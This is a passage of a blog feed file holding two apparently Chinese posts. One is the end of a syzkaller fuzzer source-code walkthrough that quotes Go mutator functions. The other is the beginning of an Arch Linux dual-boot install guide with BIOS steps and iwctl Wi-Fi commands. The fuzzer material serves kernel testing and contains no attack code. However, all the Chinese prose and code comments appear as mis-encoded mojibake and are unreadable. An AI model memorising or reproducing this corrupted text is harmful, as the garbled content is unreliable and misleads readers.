class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> blobs []*DataArg<br><span class="hljs-keyword">var</span> bases []*PointerArg<br>ForeachSubArg(ptr.arg, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> data, ok := arg.(*DataArg); ok &amp;&amp; arg.Dir() != DirOut &#123;<br>blobs = <span class="hljs-built_in">append</span>(blobs, data)<br>bases = <span class="hljs-built_in">append</span>(bases, ctx.Base)<br>&#125;<br>&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blobs) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è°ƒç”¨ <code>analyze()</code> è¿›è¡Œåˆ†æï¼Œä¹‹åè°ƒç”¨ <code>mutateData()</code> æ¥å¯¹å‚æ•°çš„æ•°æ®è¿›è¡Œå˜å¼‚ï¼Œä»¥åŠå¯¹æŒ‡é’ˆçš„æ›´æ–°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// æ³¨æ„: æˆ‘ä»¬éœ€è¦åœ¨å˜å¼‚ä¹‹å‰è°ƒç”¨ analyze.</span><br><span class="hljs-comment">// åœ¨å˜å¼‚åå…¶å¯ä»¥å¢é•¿åˆ°è¶…è¿‡æ•°æ®åŒºåŸŸçš„èŒƒå›´ï¼Œ</span><br><span class="hljs-comment">// åœ¨æ ‡è®°ç°æœ‰åˆ†é…æ—¶ analyze å°†ä¸º OOB è®¿é—®å´©æºƒ.</span><br>s := analyze(ctx.ct, ctx.corpus, p, ptr.call)<br><span class="hljs-comment">// TODO(dvyukov): æˆ‘ä»¬å¯èƒ½æƒ³è¦ä¸º ANY å¼„ä¸€ä¸ªç‰¹åˆ«çš„å˜å¼‚.</span><br><span class="hljs-comment">// ä¾‹å¦‚ï¼Œåˆå¹¶ç›¸é‚»çš„ ANYBLOBs (æˆ‘ä»¬å¹¶ä¸åˆ›é€ ä»–ä»¬,</span><br><span class="hljs-comment">// ä½†ä»–ä»¬èƒ½åœ¨å°†æ¥å‡ºç°); æˆ–æ˜¯ç”¨ä¸€ä¸ª blob æ›¿ä»£ ANYRES</span><br><span class="hljs-comment">// (å¹¶ä½¿ç”¨ç›¸é‚»çš„ blobs å°†å…¶åˆå¹¶).</span><br>idx := r.Intn(<span class="hljs-built_in">len</span>(blobs))<br>arg := blobs[idx]<br>base := bases[idx]<br>baseSize := base.Res.Size()<br>arg.data = mutateData(r, arg.Data(), <span class="hljs-number">0</span>, maxBlobLen)<br><span class="hljs-comment">// è‹¥ size å˜å¤§äº†åˆ™æ›´æ–°åŸºæŒ‡é’ˆ.</span><br><span class="hljs-keyword">if</span> baseSize &lt; base.Res.Size() &#123;<br>newArg := r.allocAddr(s, base.Type(), base.Dir(), base.Res.Size(), base.Res)<br>*base = *newArg<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-splice-ï¼šéšæœºé€‰å–è¯­æ–™åº“ä¸­ä¸€ä¸ªç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºéšæœºä½ç½®ä¸­"><a href="#mutator-splice-ï¼šéšæœºé€‰å–è¯­æ–™åº“ä¸­ä¸€ä¸ªç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºéšæœºä½ç½®ä¸­" class="headerlink" title="mutator.splice()ï¼šéšæœºé€‰å–è¯­æ–™åº“ä¸­ä¸€ä¸ªç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºéšæœºä½ç½®ä¸­"></a>mutator.splice()ï¼šéšæœºé€‰å–è¯­æ–™åº“ä¸­ä¸€ä¸ªç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºéšæœºä½ç½®ä¸­</h4><p>è¯¥å‡½æ•°ä¸ºç¼–è¯‘è¿‡ç¨‹å½“ä¸­æ¦‚ç‡æœ€å¤§çš„ä¸»åˆ†æ”¯ï¼Œä¸è¿‡å…¶é€»è¾‘æ¯”è¾ƒç®€çŸ­ï¼š</p><ul><li>é¦–å…ˆä»è¯­æ–™åº“ä¸­éšæœºå¤åˆ¶ä¸€ä¸ªç¨‹åº</li><li>é€‰æ‹©ä¸€ä¸ªéšæœºä¸‹æ ‡ <code>idx</code> ï¼Œåœ¨å¾…å˜å¼‚ç¨‹åºè¯¥ä¸‹æ ‡å¤„æ’å…¥ <code>p0</code> çš„ç³»ç»Ÿè°ƒç”¨ç»„</li><li>ä»æœ«å°¾ç§»é™¤å¤šä½™çš„è°ƒç”¨</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// è¯‘æ³¨ï¼šæ³¨é‡Šå†™å¾—æ¯”è¾ƒæŠ½è±¡è¿™é‡Œå°±ä¸è´´äº†ï¼šï¼‰</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> splice() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ctx.corpus) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>p0 := ctx.corpus[r.Intn(<span class="hljs-built_in">len</span>(ctx.corpus))]<br>p0c := p0.Clone()<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls[:idx], <span class="hljs-built_in">append</span>(p0c.Calls, p.Calls[idx:]...)...)<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(p.Calls) - <span class="hljs-number">1</span>; i &gt;= ctx.ncalls; i-- &#123;<br>p.RemoveCall(i)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-insertCall-ï¼šéšæœºç”Ÿæˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºä¸­éšæœºä½ç½®"><a href="#mutator-insertCall-ï¼šéšæœºç”Ÿæˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºä¸­éšæœºä½ç½®" class="headerlink" title="mutator.insertCall()ï¼šéšæœºç”Ÿæˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºä¸­éšæœºä½ç½®"></a>mutator.insertCall()ï¼šéšæœºç”Ÿæˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ’å…¥åˆ°ç¨‹åºä¸­éšæœºä½ç½®</h4><p>è¯¥å‡½æ•°çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€çŸ­ï¼Œè‹¥ç¨‹åºä¸­è°ƒç”¨æ•°é‡å·²ç»è¾¾åˆ° <code>ncalls</code> çš„é™åˆ¶åˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™ä¼šå…ˆè°ƒç”¨ <code>analyze()</code> è¿›è¡Œåˆ†æï¼Œéšåè°ƒç”¨ <code>generateCall()</code> ç”Ÿæˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å¹¶æ’å…¥åˆ°ç¨‹åºä¸­çš„ä¸€ä¸ªéšæœºä½ç½®</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// åœ¨ä¸€ä¸ªéšæœºç‚¹ï¼ˆå€¾å‘äºç°æœ‰ç¨‹åºçš„æœ«å°¾ï¼‰æ’å…¥ä¸€ä¸ªéšæœºè°ƒç”¨</span><br><span class="hljs-comment">// è‹¥è¯¥ç¨‹åºè°ƒç”¨æ•°é‡æ—©å·²è¾¾åˆ° ncallsï¼ˆè¯‘æ³¨ï¼šé™åˆ¶æ•°é‡ï¼‰åˆ™ä¸ä¼šæ’å…¥ï¼‰</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> insertCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.biasedRand(<span class="hljs-built_in">len</span>(p.Calls)+<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">var</span> c *Call<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>c = p.Calls[idx]<br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>calls := r.generateCall(s, p, idx)<br>p.insertBefore(c, calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-mutateArg-ï¼šéšæœºå˜å¼‚ç¨‹åºä¸­æŸä¸€ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"><a href="#mutator-mutateArg-ï¼šéšæœºå˜å¼‚ç¨‹åºä¸­æŸä¸€ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°" class="headerlink" title="mutator.mutateArg()ï¼šéšæœºå˜å¼‚ç¨‹åºä¸­æŸä¸€ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"></a>mutator.mutateArg()ï¼šéšæœºå˜å¼‚ç¨‹åºä¸­æŸä¸€ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</h4><p>è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨ä¾¿æ˜¯éšæœºå˜å¼‚ç¨‹åºä¸­æŸä¸€ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥å±•å¼€åˆ†æäº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥ç›´æ¥çœ‹æºç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> mutateArg() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br>idx := chooseCall(p, r)<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>c := p.Calls[idx]<br><span class="hljs-keyword">if</span> ctx.noMutate[c.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>updateSizes := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br>ok = <span class="hljs-literal">true</span><br>ma := &amp;mutationArgs&#123;target: p.Target&#125;<br>ForeachArg(c, ma.collectArg)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ma.args) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>arg, argCtx := ma.chooseArg(r.Rand)<br>calls, ok1 := p.Target.mutateArg(r, s, arg, argCtx, &amp;updateSizes)<br><span class="hljs-keyword">if</span> !ok1 &#123;<br>ok = <span class="hljs-literal">false</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>p.insertBefore(c, calls)<br>idx += <span class="hljs-built_in">len</span>(calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>idx--<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-built_in">len</span>(p.Calls) || p.Calls[idx] != c &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;wrong call index: idx=%v calls=%v p.Calls=%v ncalls=%v&quot;</span>,<br>idx, <span class="hljs-built_in">len</span>(calls), <span class="hljs-built_in">len</span>(p.Calls), ctx.ncalls))<br>&#125;<br><span class="hljs-keyword">if</span> updateSizes &#123;<br>p.Target.assignSizesCall(c)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-removeCall-ï¼šéšæœºç§»é™¤ç¨‹åºä¸­çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨"><a href="#mutator-removeCall-ï¼šéšæœºç§»é™¤ç¨‹åºä¸­çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨" class="headerlink" title="mutator.removeCall()ï¼šéšæœºç§»é™¤ç¨‹åºä¸­çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨"></a>mutator.removeCall()ï¼šéšæœºç§»é™¤ç¨‹åºä¸­çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨</h4><p>è¯¥å‡½æ•°ä¹Ÿæ¯”è¾ƒç®€çŸ­ï¼Œä¸»è¦å°±æ˜¯éšæœºç§»é™¤ç¨‹åºä¸­çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰ç³»ç»Ÿè°ƒç”¨åˆ™ä¸ä¼šè¿›è¡Œç§»é™¤æ“ä½œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> removeCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.RemoveCall(idx)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œsyz-fuzzer ä¸»ä½“æºç é€»è¾‘åˆ†æå®Œæ¯•</p><blockquote><p>ç®€å•æ€»ç»“çš„è¯ï¼Œç¬”è€…æ„Ÿè§‰å…¶å®ä¸»è¦éƒ½æ˜¯åå·¥ç¨‹æ€§çš„ä¸œè¥¿æ¯”è¾ƒå¤šğŸ¤”</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ï¼ˆæ‘˜ä¸‹çœ¼é•œï¼‰Furryï¼Ÿï¼ˆæˆ´ä¸Šçœ¼é•œï¼‰Fuzzerï¼&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>ã€DISTRO.0x00ã€‘ä»é›¶å¼€å§‹çš„ Arch Linux ç”Ÿæ´»</title>
    <link href="https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/</id>
    <published>2023-09-24T15:25:17.000Z</published>
    <updated>2023-11-23T15:40:29.819Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¥½ç”¨ï¼Œåœ¨å®‰è£…ç•Œé¢ç¡äº†ä¸‰ä¸ªå°æ—¶</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬ç§‘é˜¶æ®µç¬”è€…ä¸€ç›´ç”¨çš„ Windows ä½œä¸ºä¸»åŠ›ç³»ç»Ÿå¹¶ä½¿ç”¨ VMWare Workstation è¿è¡Œ Linux è™šæ‹Ÿæœºï¼Œä½†æ€»æ„Ÿè§‰ä¸å¤Ÿå¾—åŠ²ï¼Œå¯æƒœç¬”è€…æœ‰ä¸€äº›ç¡¬æ€§éœ€æ±‚åªèƒ½åœ¨ Windows ä¸Šå®Œæˆï¼ˆæ¯”å¦‚è¯´æ¸¸æˆã€ç»˜å›¾ç­‰ï¼‰ï¼Œç”±äºä»…æœ‰ä¸€å°ç”µè„‘çš„ç¼˜æ•…ï¼Œæ‰€ä»¥ä¸€ç›´æ²¡æœ‰æœºä¼šåœ¨çœŸæœºä¸Šå®‰è£… Linux æ“ä½œç³»ç»Ÿ ï¼š(</p><p>å¼€å§‹è¯» Phd ä¹‹åè€æ¿æ¯”è¾ƒé˜”æ°”å¤§æ‰‹ä¸€æŒ¥ç›´æ¥é…äº†ä¸€ä¸ªæ–°çš„ç¬”è®°æœ¬ç”¨æ¥å·¥ä½œï¼Œäºæ˜¯ç¬”è€…å†³å®šè¿™ä¸€æ¬¡ç›´æ¥åœ¨çœŸæœºä¸Šå®‰è£… Linux ï¼Œä¸“é—¨ç”¨æ¥åšå·¥ä½œä¸Šçš„äº‹æƒ…</p><p>å…³äºå‘è¡Œç‰ˆçš„é€‰æ‹©ï¼Œç¬”è€…å†³å®šé€‰æ‹©å®‰è£… <a href="https://archlinux.org/">Arch Linux</a>ï¼Œå› ä¸ºå…¶æœ‰ç€è¾ƒä¸ºå®Œå¤‡çš„å„ç±»æ–‡æ¡£åŠé©±åŠ¨é€‚é…ç­‰ï¼ŒåŒæ—¶ç¬”è€…çš„æ–°ç¬”è®°æœ¬çš„ç‰Œå­ä¸ºåç¡•ï¼Œå…¶åŒæ ·æœ‰ä¸€ä¸ªè¾ƒä¸ºå®Œå–„çš„<a href="https://asus-linux.org/">ç¬¬ä¸‰æ–¹ç¤¾åŒº</a>æ”¯æŒ</p><p>ä¸è¿‡è€ƒè™‘åˆ°æœ‰äº›å·¥ä½œå¯èƒ½è¿˜æ˜¯åœ¨ Windows ä¸Šåšä¼šæ¯”è¾ƒæ–¹ä¾¿ï¼ˆä¾‹å¦‚è°ƒè¯• Windows ç¨‹åºï¼‰ï¼Œå†åŠ ä¸ŠåŸè£…çš„ Windows ç³»ç»Ÿæ¯•ç«Ÿæ˜¯æ”¶äº†ç¬”è€…çš„é’±çš„ï¼Œç›´æ¥æŠ¹æ‰çš„è¯æœªå…æœ‰ç‚¹å¯æƒœï¼ˆç¬‘ï¼‰ï¼Œæ‰€ä»¥ç¬”è€…æœ€ç»ˆçš„ç­–ç•¥æ˜¯<strong>å®‰è£… Windows + Linux åŒç³»ç»Ÿï¼Œæ—¥å¸¸ä¸»åŠ›è¿˜æ˜¯ä½¿ç”¨ Linux ç³»ç»Ÿ</strong></p><h1 id="0x01-å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#0x01-å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01. å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ"></a>0x01. å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ</h1><h3 id="åˆ¶ä½œ-Arch-Linux-ç‰©ç†å®‰è£…åª’ä»‹"><a href="#åˆ¶ä½œ-Arch-Linux-ç‰©ç†å®‰è£…åª’ä»‹" class="headerlink" title="åˆ¶ä½œ Arch Linux ç‰©ç†å®‰è£…åª’ä»‹"></a>åˆ¶ä½œ Arch Linux ç‰©ç†å®‰è£…åª’ä»‹</h3><p>é¦–å…ˆåœ¨ <a href="https://archlinux.org/download/">https://archlinux.org/download/</a> ä¸‹è½½æœ€æ–°çš„ Arch Linux é•œåƒï¼Œè¿™é‡Œæä¾›äº†å‡ ä¸ªé•œåƒç«™ï¼Œå¯ä»¥ç›´æ¥é€‰ç¦»ä½ æœ€è¿‘çš„é‚£ä¸€ä¸ªï¼šï¼‰</p><p>å®Œæˆé•œåƒä¸‹è½½ä¹‹åç›´æ¥çƒ§å½•åˆ° U ç›˜ä¸Šå³å¯ï¼Œè¿™é‡Œç¬”è€…ç”¨çš„æ˜¯ <a href="https://etcher.balena.io/">balenaEtcher</a> ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/5lqvTSMEXz4xmQr.png"></p><h3 id="å…³é—­-Secure-Boot"><a href="#å…³é—­-Secure-Boot" class="headerlink" title="å…³é—­ Secure Boot"></a>å…³é—­ Secure Boot</h3><p>ç”±äº Arch Linux çš„å®‰è£…åª’ä»‹æš‚ä¸æ”¯æŒå®‰å…¨å¯åŠ¨ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ç”µè„‘çš„è¿™ä¸ªç‰¹æ€§æš‚ä¸”å…³é—­</p><p>åç¡•ç¬”è®°æœ¬è¿›å…¥ BIOS çš„æ–¹æ³•ä¸ºï¼šé¦–å…ˆæ‘ä½ <code>F2</code>ï¼Œç„¶åæŒ‰ä¸€ä¸‹å¼€æœºé”®ï¼Œä¸€ç›´åˆ° BIOS ç•Œé¢å‡ºç°åæ¾å¼€ <code>F2</code> å³å¯</p><p>ç‚¹å‡» <code>è¿›é˜¶è®¾ç½®â†’å®‰å…¨æ€§</code>ï¼ŒæŠŠ <code>å®‰å…¨å¯åŠ¨æ§åˆ¶</code> æ”¹ä¸º <code>å…³é—­</code> å³å¯ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/wsMylQKgk9XA4WR.jpg" alt="å…³é—­å®‰å…¨å¯åŠ¨"></p><h3 id="åˆ†é…-Linux-ç£ç›˜ç©ºé—´"><a href="#åˆ†é…-Linux-ç£ç›˜ç©ºé—´" class="headerlink" title="åˆ†é… Linux ç£ç›˜ç©ºé—´"></a>åˆ†é… Linux ç£ç›˜ç©ºé—´</h3><p>ç›´æ¥å³é”® <code>æˆ‘çš„ç”µè„‘â†’æ˜¾ç¤ºæ›´å¤šé€‰é¡¹â†’ç®¡ç†â†’ç£ç›˜ç®¡ç†</code> æ‹‰ä¸€å—ç©ºçš„åŒºåŸŸå‡ºæ¥å°±è¡Œï¼š</p><p><img src="https://s2.loli.net/2023/09/18/tn92KjiBeLA7Zv8.jpg"></p><h1 id="0x02-å®‰è£…-Arch-Linux"><a href="#0x02-å®‰è£…-Arch-Linux" class="headerlink" title="0x02. å®‰è£… Arch Linux"></a>0x02. å®‰è£… Arch Linux</h1><blockquote><p>ä¸»è¦è¿˜æ˜¯å‚ç…§<a href="https://wiki.archlinux.org/title/installation_guide">å®˜æ–¹æ–‡æ¡£</a>æ¥å¼„</p></blockquote><h3 id="äº‹å‰å‡†å¤‡"><a href="#äº‹å‰å‡†å¤‡" class="headerlink" title="äº‹å‰å‡†å¤‡"></a>äº‹å‰å‡†å¤‡</h3><p>é¦–å…ˆè¿˜æ˜¯è¿› BIOS æ”¹å¯åŠ¨é¡ºåºæŠŠå®‰è£…ä»‹è´¨è°ƒåˆ°ç¬¬ä¸€ä½ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/dTlZOjgPWbvE18z.png"></p><p>ç„¶åå°±æ¥åˆ°äº† <code>GRUB</code>ï¼Œæ­£å¸¸æƒ…å†µä¸‹ç›´æ¥é€‰ç¬¬ä¸€ä¸ªå°±è¡Œï¼š</p><p><img src="https://s2.loli.net/2023/09/18/og6ebnwTvEcGkHs.jpg"></p><p>å¦‚æœä½ éœ€è¦ä½¿ç”¨æ— çº¿ç½‘ç»œï¼Œå¯ä»¥è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">iwctl       <span class="hljs-comment"># è¿›å…¥æ— çº¿ç½‘ç»œæ§åˆ¶ç•Œé¢</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">device list <span class="hljs-comment"># æŸ¥çœ‹æ— çº¿ç½‘å¡ä¿¡æ¯</span></span><br></code></pre></td></tr></table></figure><p>ç¬”è€…è¿™é‡Œæ˜¾ç¤ºçš„ç½‘å¡è®¾å¤‡åæ˜¯ <code>wlan0</code> ï¼Œæ¥ä¸‹æ¥è¾“å…¥å¦‚ä¸‹å‘½ä»¤æ‰«æé™„è¿‘çš„çš„æ— çº¿ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 scan <span class="hljs-comment"># æ‰«æ</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 get-networks <span class="hljs-comment"># æ˜¾ç¤ºç»“æœ</span></span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨ <code>connect</code> å‚æ•°è¿›è¡Œè¿æ¥ï¼Œä¾‹å¦‚è¿™é‡Œå‡è®¾ç½‘ç»œåä¸º <code>BeastSenbei</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 connect BeastSenbei <span class="hljs-comment"># å¦‚æœæœ‰å¯†ç åˆ™ä¼šè¦æ±‚ä½ è¾“å…¥</span></span><br></code></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥è¾“å…¥ <code>exit</code> å³å¯é€€å‡ºè¯¥ç•Œé¢</p><blockquote><p>ä½ å¯ä»¥ä½¿ç”¨ <code>pacman -Syyy</code> å‘½ä»¤æµ‹è¯•ç½‘ç»œæ˜¯å¦è”é€šï¼Œè‹¥è¦æ¢æºåˆ™ç›´æ¥ç¼–è¾‘ <code>/etc/pacman.d/mirrorlist</code> æ–‡ä»¶å³å¯</p></blockquote><h3 